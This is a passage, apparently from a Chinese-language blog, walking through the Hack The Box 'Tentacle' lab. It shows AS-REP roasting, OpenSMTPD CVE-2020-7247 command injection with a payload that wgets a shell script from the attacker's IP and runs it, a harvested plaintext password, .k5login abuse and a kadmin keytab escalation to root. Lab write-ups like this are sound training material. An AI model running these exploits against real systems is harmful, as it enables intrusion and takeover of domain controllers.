+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$proxychains -q nmap --top-ports 1000 -sT -Pn 10.241.251.113 </span><br><span class="line">Nmap scan report for 10.241.251.113</span><br><span class="line">Host is up (0.54s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">25&#x2F;tcp open  smtp</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 576.06 seconds</span><br></pre></td></tr></table></figure>
+
+<p>发现了smtp服务，跟进一步尝试枚举版本信息</p>
+<p><img src="../images/Tentacle/15.png" alt="15"></p>
+<p>得到OpenSMTPD 2.0.0</p>
+<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><h2 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP-Roasting"></a>AS-REP-Roasting</h2><p>这是一台Linux DC，所以尝试常见的域攻击。比如这里有了用户名，尝试AS-REP-Roasting</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$GetNPUsers.py -no-pass -dc-ip 10.10.10.224 realcorp.htb&#x2F;j.nakazawa</span><br><span class="line">Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Getting TGT for j.nakazawa</span><br><span class="line">$krb5asrep$18$j.nakazawa@REALCORP.HTB:34e1ead17609b2a97d154edb58ab68c3$445c6d8e4edf3d5e8fd82bffc141f37ba8161a0d71be9dc1fcee145527f7544ba97c99997075047cd8bd5d351fe6b1602883910d8009903ca07460868fd9e779752584484c73002f5271fcce1f51c8898770ef7bb750a92f16f8645d7289739bfecaffe4b593ee510e05b071553725a0e1a1dafc61ea4d63ac2592abcc872a7c5be541baeeb124b873de77bfa2282c300e2bdede1d3c5399f85e8ba3dc6466f3e5df3f6806f96e156809874f9a915a10bc4406549af08b03924da5e059a73ffe15a5c02bd16e93b96875c65ba6a766bbc9db2041a2d388d32e61</span><br></pre></td></tr></table></figure>
+
+<p>这里Linux使用AES-256，而不是Windows上常见的RC4-HMAC，Hashcat目前不能支持:<a target="_blank" rel="noopener" href="https://github.com/hashcat/hashcat/issues/2603">issue</a></p>
+<p>John似乎能够正常破解，但是这里并没有破解成功</p>
+<p><img src="../images/Tentacle/6.png" alt="6"></p>
+<h2 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h2><p>搜索SMTP公开漏洞，可以找到<code>47984.py</code>(CVE-2020-7247)<br>当前版本符合2.0.0应该是符合漏洞要求<code>OpenSMTPD &lt; 6.6.2</code></p>
+<p><img src="../images/Tentacle/16.png" alt="16"></p>
+<p>这个漏洞看似是某种命令注入漏洞</p>
+<p><img src="../images/Tentacle/17.png" alt="17"></p>
+<p>尝试手动完成漏洞利用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$proxychains -q nc -nv -C 10.241.251.113 25</span><br><span class="line">(UNKNOWN) [10.241.251.113] 25 (smtp) open : Operation now in progress</span><br><span class="line">220 smtp.realcorp.htb ESMTP OpenSMTPD</span><br><span class="line"></span><br><span class="line">HELO x</span><br><span class="line">250 smtp.realcorp.htb Hello x [10.241.251.1], pleased to meet you</span><br><span class="line"></span><br><span class="line">MAIL FROM:&lt;;ping -c 3 10.10.16.24;&gt;                    </span><br><span class="line">250 2.0.0 Ok</span><br><span class="line"></span><br><span class="line">RCPT TO:&lt;root&gt;									#这里不存在root用户</span><br><span class="line">550 Invalid recipient: &lt;root@smtp.realcorp.htb&gt;</span><br><span class="line"></span><br><span class="line">RCPT TO:&lt;j.nakazawa@realcorp.htb&gt;				#可以使用之前发现的一个用户邮箱</span><br><span class="line">250 2.1.5 Destination address valid: Recipient ok</span><br></pre></td></tr></table></figure>
+
+<p>之后有个坑，要满足RFC 2822，不能如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DATA                                             </span><br><span class="line">354 Enter mail, end with &quot;.&quot; on a line by itself</span><br><span class="line">blabla                                           </span><br><span class="line">.                                                </span><br><span class="line">550 5.7.1 Delivery not authorized, message refused: Message is not RFC 2822 compliant</span><br></pre></td></tr></table></figure>
+
+<p>这里需要一个<code>\r\n</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DATA                                                                                              </span><br><span class="line">354 Enter mail, end with &quot;.&quot; on a line by itself</span><br><span class="line">                                                 </span><br><span class="line">evil                                             </span><br><span class="line">.                                                </span><br><span class="line">250 2.0.0 78d7f7b5 Message accepted for delivery</span><br></pre></td></tr></table></figure>
+
+<p>当表示邮件发出时，成功得到RCE</p>
+<p><img src="../images/Tentacle/18.png" alt="18"></p>
+<p>开始使用python脚本，修改收件人</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.send(b&#39;RCPT TO:&lt;j.nakazawa@realcorp.htb&gt;\r\n&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>这里反弹shell的命令比较挑剔，有些字符是不能用的，而且机器上似乎没有<code>curl</code></p>
+<p><img src="../images/Tentacle/19.png" alt="19"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$proxychains -q python3 47984.py 10.241.251.113 25 &#39;wget 10.10.16.24&#x2F;shell.sh -O &#x2F;tmp&#x2F;shell.sh;bash &#x2F;tmp&#x2F;shell.sh&#39;</span><br><span class="line">[*] OpenSMTPD detected</span><br><span class="line">[*] Connected, sending payload</span><br><span class="line">[*] Payload sent</span><br><span class="line">[*] Done</span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/Tentacle/20.png" alt="20"></p>
+<p>得到smtp服务器上的root，可以使用script升级为交互式shell</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>感觉处于某个容器之中，也许是<code>podman</code></p>
+<p><img src="../images/Tentacle/21.png" alt="21"></p>
+<h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>在用户目录，发现了<code>.msmtprc</code>(STMP客户端配置文件)，里面存有密码<code>sJB&#125;RM&gt;6Z~64_</code></p>
+<p><img src="../images/Tentacle/22.png" alt="22"></p>
+<p>在kali和已经拿下的机器上尝试ssh，都失败了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh j.nakazawa@10.10.10.224</span><br><span class="line">j.nakazawa@10.10.10.224&#39;s password: </span><br><span class="line">Permission denied, please try again.</span><br></pre></td></tr></table></figure>
+
+<h3 id="Kerberos-ticket"><a href="#Kerberos-ticket" class="headerlink" title="Kerberos ticket"></a>Kerberos ticket</h3><p>我们有了当前用户的密码，而且目标是一台Linux KDC，可以尝试制作Kerberos票据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install krb5-user</span><br></pre></td></tr></table></figure>
+
+<p>Kerberos对票据非常挑剔，我们需要知道Linux的主机名，这里猜测为之前3128端口显示的<code>srv01.realcorp.htb</code><br>这里不好的地方是该主机名不能够被DNS解析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$nslookup</span><br><span class="line">&gt; server 10.10.10.224</span><br><span class="line">Default server: 10.10.10.224</span><br><span class="line">Address: 10.10.10.224#53</span><br><span class="line">&gt; srv01.realcorp.htb</span><br><span class="line">Server:         10.10.10.224</span><br><span class="line">Address:        10.10.10.224#53</span><br><span class="line"></span><br><span class="line">** server can&#39;t find srv01.realcorp.htb: NXDOMAIN</span><br></pre></td></tr></table></figure>
+
+<p>修改配置文件<code>/etc/krb5.conf</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv &#x2F;etc&#x2F;krb5.conf &#x2F;etc&#x2F;krb5.conf.bak</span><br><span class="line">vim &#x2F;etc&#x2F;krb5.conf</span><br></pre></td></tr></table></figure>
+
+<p>如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[libdefaults]</span><br><span class="line">  default_realm &#x3D; REALCORP.HTB</span><br><span class="line"></span><br><span class="line">[realms]</span><br><span class="line">  REALCORP.HTB &#x3D; &#123;</span><br><span class="line">    kdc &#x3D; srv01.realcorp.htb:88</span><br><span class="line">    &#125;</span><br><span class="line">[domain_realm]</span><br><span class="line">  .realcorp.htb &#x3D; REALCORP.HTB</span><br><span class="line">  realcorp.htb &#x3D; REALCORP.HTB</span><br></pre></td></tr></table></figure>
+
+<p>修改hosts，只保留<code>srv01.realcorp.htb</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.224 	srv01.realcorp.htb</span><br></pre></td></tr></table></figure>
+
+<p>*实测这里Linux KDC对hosts的位置很挑剔，比如把srv01放在后面，就会导致认证失败，必须放在hosts和ip对应的第一个 Σ(っ °Д °;)っ</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.224 	blabla.corp.htb srv01.realcorp.htb</span><br></pre></td></tr></table></figure>
+
+<p>生成票据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$kinit j.nakazawa</span><br><span class="line">Password for j.nakazawa@REALCORP.HTB:sJB&#125;RM&gt;6Z~64_</span><br><span class="line"></span><br><span class="line">$klist</span><br><span class="line">Ticket cache: FILE:&#x2F;tmp&#x2F;krb5cc_0</span><br><span class="line">Default principal: j.nakazawa@REALCORP.HTB</span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">07&#x2F;02&#x2F;2021 16:18:45  07&#x2F;03&#x2F;2021 16:18:39  krbtgt&#x2F;REALCORP.HTB@REALCORP.HTB</span><br></pre></td></tr></table></figure>
+
+<p>*如果这里时间的偏移量，+/- 300秒应该就可以，可以使用ntp和KDC进行同步</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ntpdate 10.10.10.224		&#x2F;&#x2F;同步</span><br><span class="line">ntpdate -q 10.10.10.224		&#x2F;&#x2F;查看偏移量</span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/Tentacle/23.png" alt="23"></p>
+<p>ssh过去即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh j.nakazawa@10.10.10.224</span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/Tentacle/24.png" alt="24"></p>
+<p>使用ssh -v，可以看到kerberos票据认证<code>gssapi-with-mic</code></p>
+<p><img src="../images/Tentacle/25.png" alt="25"></p>
+<h2 id="user2"><a href="#user2" class="headerlink" title="user2"></a>user2</h2><p>找到计划任务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[j.nakazawa@srv01 ~]$ cat &#x2F;etc&#x2F;crontab </span><br><span class="line">SHELL&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">PATH&#x3D;&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin</span><br><span class="line">MAILTO&#x3D;root</span><br><span class="line"></span><br><span class="line"># For details see man 4 crontabs</span><br><span class="line"></span><br><span class="line"># Example of job definition:</span><br><span class="line"># .---------------- minute (0 - 59)</span><br><span class="line"># |  .------------- hour (0 - 23)</span><br><span class="line"># |  |  .---------- day of month (1 - 31)</span><br><span class="line"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="line"># |  |  |  |  .---- day of week (0 - 6) (Sunday&#x3D;0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="line"># |  |  |  |  |</span><br><span class="line"># *  *  *  *  * user-name  command to be executed</span><br><span class="line">* * * * * admin &#x2F;usr&#x2F;local&#x2F;bin&#x2F;log_backup.sh</span><br></pre></td></tr></table></figure>
+
+<p>查看计划任务的权限，这里有SELinux(文件后的<code>.</code>)，可以查看ACL</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[j.nakazawa@srv01 ~]$ ls -l &#x2F;usr&#x2F;local&#x2F;bin&#x2F;log_backup.sh</span><br><span class="line">-rwxr-xr--. 1 root admin 229 Dec  9  2020 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;log_backup.sh</span><br><span class="line"></span><br><span class="line">[j.nakazawa@srv01 ~]$ getfacl &#x2F;usr&#x2F;local&#x2F;bin&#x2F;log_backup.sh</span><br><span class="line">getfacl: Removing leading &#39;&#x2F;&#39; from absolute path names</span><br><span class="line"># file: usr&#x2F;local&#x2F;bin&#x2F;log_backup.sh</span><br><span class="line"># owner: root</span><br><span class="line"># group: admin</span><br><span class="line">user::rwx</span><br><span class="line">group::r-x</span><br><span class="line">other::r--</span><br></pre></td></tr></table></figure>
+
+<p>我们拥有读取权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[j.nakazawa@srv01 ~]$ cat &#x2F;usr&#x2F;local&#x2F;bin&#x2F;log_backup.sh</span><br><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;rsync -avz --no-perms --no-owner --no-group &#x2F;var&#x2F;log&#x2F;squid&#x2F; &#x2F;home&#x2F;admin&#x2F;</span><br><span class="line">cd &#x2F;home&#x2F;admin</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;tar czf squid_logs.tar.gz.&#96;&#x2F;usr&#x2F;bin&#x2F;date +%F-%H%M%S&#96; access.log cache.log</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;rm -f access.log cache.log</span><br></pre></td></tr></table></figure>
+
+<p>这个脚本将<code>/var/log/squid/</code>下的文件备份到<code>/home/admin/</code>目录下，之后压缩<code>access.log</code>和<code>cache.log</code>到一个包含时间戳的压缩包文件，最后清理这两个log文件</p>
+<p>对于<code>/var/log/squid/</code>，当前用户处于<code>squid</code>组，没有R权限，但有W权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[j.nakazawa@srv01 log]$ ls -la |grep squid</span><br><span class="line">drwx-wx---.  3 admin  squid      53 Jul  2 12:49 squid</span><br><span class="line">[j.nakazawa@srv01 log]$ getfacl squid</span><br><span class="line"># file: squid</span><br><span class="line"># owner: admin</span><br><span class="line"># group: squid</span><br><span class="line">user::rwx</span><br><span class="line">group::-wx</span><br><span class="line">other::---</span><br><span class="line"></span><br><span class="line">[j.nakazawa@srv01 log]$ groups</span><br><span class="line">j.nakazawa squid users</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>尝试写一个<code>authorized_keys</code>到<code>/var/log/squid/.ssh</code>下，不过没有生效</p>
+<h3 id="Kerberos-k5login"><a href="#Kerberos-k5login" class="headerlink" title="Kerberos .k5login"></a>Kerberos .k5login</h3><p><code>.k5login</code>这是Linux Kerberos上的一个有趣的文件，它机制类似于<code>authorized_keys</code>，参考:<a target="_blank" rel="noopener" href="https://web.mit.edu/kerberos/krb5-devel/doc/user/user_config/k5login.html">链接</a></p>
+<p>将Keberos principals写入到这个文件里，就能获得用户的访问权限。我们已经有<code>j.nakazawa</code>的kerberos ticket，也就是说，如果我们将它作为主体写入到<code>admin</code>用户目录的<code>.k5login</code>里，我们可以使用该票证完成对于<code>admin</code>用户的身份验证</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;j.nakazawa@REALCORP.HTB&quot; &gt; &#x2F;var&#x2F;log&#x2F;squid&#x2F;.k5login</span><br></pre></td></tr></table></figure>
+
+<p>等待1分钟</p>
+<p><img src="../images/Tentacle/26.png" alt="26"></p>
+<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>找到<code>/etc/krb5.keytab</code></p>
+<p><img src="../images/Tentacle/27.png" alt="27"></p>
+<p>这也可以手动枚举找到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -group admin -type f 2&gt;&#x2F;dev&#x2F;null | grep -Ev &quot;^&#x2F;sys|^&#x2F;run|^&#x2F;proc&quot;</span><br></pre></td></tr></table></figure>
+
+<p>关于<code>keytab</code>文件，在<strong>OSEP</strong>里有讲到。简单介绍:Keytab包含Kerberos主题名称和加密密钥，这允许用户或脚本代表服务主体对网络上的其他Kerberos资源进行身份验证而无需输入密码</p>
+<p>通常这个文件只能由root读取，但这里我们<code>admin</code>组也能够读取它</p>
+<p>这是一个二进制文件，可以使用<code>klist -kt</code>读取它</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[admin@srv01 tmp]$ file &#x2F;etc&#x2F;krb5.keytab</span><br><span class="line">&#x2F;etc&#x2F;krb5.keytab: Kerberos Keytab file, realm&#x3D;REALCORP.HTB, principal&#x3D;host&#x2F;srv01.realcorp.htb, type&#x3D;1, date&#x3D;Tue Dec  8 22:15:30 2020, kvno&#x3D;2</span><br><span class="line"></span><br><span class="line">[admin@srv01 tmp]$ klist -kt</span><br><span class="line">Keytab name: FILE:&#x2F;etc&#x2F;krb5.keytab</span><br><span class="line">KVNO Timestamp           Principal</span><br><span class="line">---- ------------------- ------------------------------------------------------</span><br><span class="line">   2 12&#x2F;08&#x2F;2020 22:15:30 host&#x2F;srv01.realcorp.htb@REALCORP.HTB</span><br><span class="line">   2 12&#x2F;08&#x2F;2020 22:15:30 host&#x2F;srv01.realcorp.htb@REALCORP.HTB</span><br><span class="line">   2 12&#x2F;08&#x2F;2020 22:15:30 host&#x2F;srv01.realcorp.htb@REALCORP.HTB</span><br><span class="line">   2 12&#x2F;08&#x2F;2020 22:15:30 host&#x2F;srv01.realcorp.htb@REALCORP.HTB</span><br><span class="line">   2 12&#x2F;08&#x2F;2020 22:15:30 host&#x2F;srv01.realcorp.htb@REALCORP.HTB</span><br><span class="line">   2 12&#x2F;19&#x2F;2020 06:00:42 kadmin&#x2F;changepw@REALCORP.HTB</span><br><span class="line">   2 12&#x2F;19&#x2F;2020 06:00:42 kadmin&#x2F;changepw@REALCORP.HTB</span><br><span class="line">   2 12&#x2F;19&#x2F;2020 06:00:42 kadmin&#x2F;changepw@REALCORP.HTB</span><br><span class="line">   2 12&#x2F;19&#x2F;2020 06:00:42 kadmin&#x2F;changepw@REALCORP.HTB</span><br><span class="line">   2 12&#x2F;19&#x2F;2020 06:00:42 kadmin&#x2F;changepw@REALCORP.HTB</span><br><span class="line">   2 12&#x2F;19&#x2F;2020 06:10:53 kadmin&#x2F;admin@REALCORP.HTB</span><br><span class="line">   2 12&#x2F;19&#x2F;2020 06:10:53 kadmin&#x2F;admin@REALCORP.HTB</span><br><span class="line">   2 12&#x2F;19&#x2F;2020 06:10:53 kadmin&#x2F;admin@REALCORP.HTB</span><br><span class="line">   2 12&#x2F;19&#x2F;2020 06:10:53 kadmin&#x2F;admin@REALCORP.HTB</span><br><span class="line">   2 12&#x2F;19&#x2F;2020 06:10:53 kadmin&#x2F;admin@REALCORP.HTB</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>默认情况下，这个文件应该只有<code>host principle</code>，不过可以发现<code>kadmin/admin@REALCORP.HTB</code>拥有<code>changepw</code>权限，这意味者能够读取这个文件的用户，可以运行<code>kadmin</code>，来管理域</p>
+<p>接下来一<code>admin</code>权限成功进入命令提示符，创建<code>root principle</code>，之后输入密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[admin@srv01 tmp]$ kadmin -kt &#x2F;etc&#x2F;krb5.keytab -p kadmin&#x2F;admin@REALCORP.HTB</span><br><span class="line">Couldn&#39;t open log file &#x2F;var&#x2F;log&#x2F;kadmind.log: Permission denied</span><br><span class="line">Authenticating as principal kadmin&#x2F;admin@REALCORP.HTB with keytab &#x2F;etc&#x2F;krb5.keytab.</span><br><span class="line"></span><br><span class="line">kadmin:  list_principals</span><br><span class="line">K&#x2F;M@REALCORP.HTB</span><br><span class="line">host&#x2F;srv01.realcorp.htb@REALCORP.HTB</span><br><span class="line">j.nakazawa@REALCORP.HTB</span><br><span class="line">kadmin&#x2F;admin@REALCORP.HTB</span><br><span class="line">kadmin&#x2F;changepw@REALCORP.HTB</span><br><span class="line">kadmin&#x2F;srv01.realcorp.htb@REALCORP.HTB</span><br><span class="line">kiprop&#x2F;srv01.realcorp.htb@REALCORP.HTB</span><br><span class="line">krbtgt&#x2F;REALCORP.HTB@REALCORP.HTB</span><br><span class="line"></span><br><span class="line">kadmin:  add_principal root</span><br><span class="line">No policy specified for root@REALCORP.HTB; defaulting to no policy</span><br><span class="line">Enter password for principal &quot;root@REALCORP.HTB&quot;: 输入密码</span><br><span class="line">Re-enter password for principal &quot;root@REALCORP.HTB&quot;: 输入密码</span><br><span class="line">Principal &quot;root@REALCORP.HTB&quot; created.</span><br><span class="line"></span><br><span class="line">kadmin:  list_principals</span><br><span class="line">K&#x2F;M@REALCORP.HTB</span><br><span class="line">host&#x2F;srv01.realcorp.htb@REALCORP.HTB</span><br><span class="line">j.nakazawa@REALCORP.HTB</span><br><span class="line">kadmin&#x2F;admin@REALCORP.HTB</span><br><span class="line">kadmin&#x2F;changepw@REALCORP.HTB</span><br><span class="line">kadmin&#x2F;srv01.realcorp.htb@REALCORP.HTB</span><br><span class="line">kiprop&#x2F;srv01.realcorp.htb@REALCORP.HTB</span><br><span class="line">krbtgt&#x2F;REALCORP.HTB@REALCORP.HTB</span><br><span class="line">root@REALCORP.HTB					&#x2F;&#x2F;root principle创建成功</span><br></pre></td></tr></table></figure>
+
+<p>*这个命令是可以通过一行来完成的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kadmin -kt &#x2F;etc&#x2F;krb5.keytab -p kadmin&#x2F;admin@REALCORP.HTB -q &quot;add_principal -pw SuperPassword123 root&quot;</span><br></pre></td></tr></table></figure>
+
+<p><code>ksu</code>通过<strong>Kerberos</strong>使用<code>su</code>，输入密码，成功提升为刚刚创建的root</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[admin@srv01 tmp]$ ksu</span><br><span class="line">WARNING: Your password may be exposed if you enter it here and are logged </span><br><span class="line">         in remotely using an unsecure (non-encrypted) channel. </span><br><span class="line">Kerberos password for root@REALCORP.HTB: : 输入之前的密码</span><br><span class="line">Authenticated root@REALCORP.HTB</span><br><span class="line">Account root: authorization for root@REALCORP.HTB successful</span><br><span class="line">Changing uid to root (0)</span><br><span class="line"></span><br><span class="line">[root@srv01 tmp]# id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) context&#x3D;unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/Tentacle/28.png" alt="28"></p>
+<h1 id="beyond-root"><a href="#beyond-root" class="headerlink" title="beyond root"></a>beyond root</h1><h2 id="sshd-config"><a href="#sshd-config" class="headerlink" title="sshd_config"></a>sshd_config</h2><p>查看sshd_config，可以发现密钥登录被禁止，所以之前的<code>authorized_keys</code>被禁用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PubkeyAuthentication no</span><br></pre></td></tr></table></figure>
+
+<p>kerberos验证启动</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GSSAPIAuthentication yes</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Linux%E9%9D%B6%E6%9C%BA/" rel="tag"># Linux靶机</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/06/05/HTB-Sniper/" rel="prev" title="HTB:Sniper">
+      <i class="fa fa-chevron-left"></i> HTB:Sniper
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
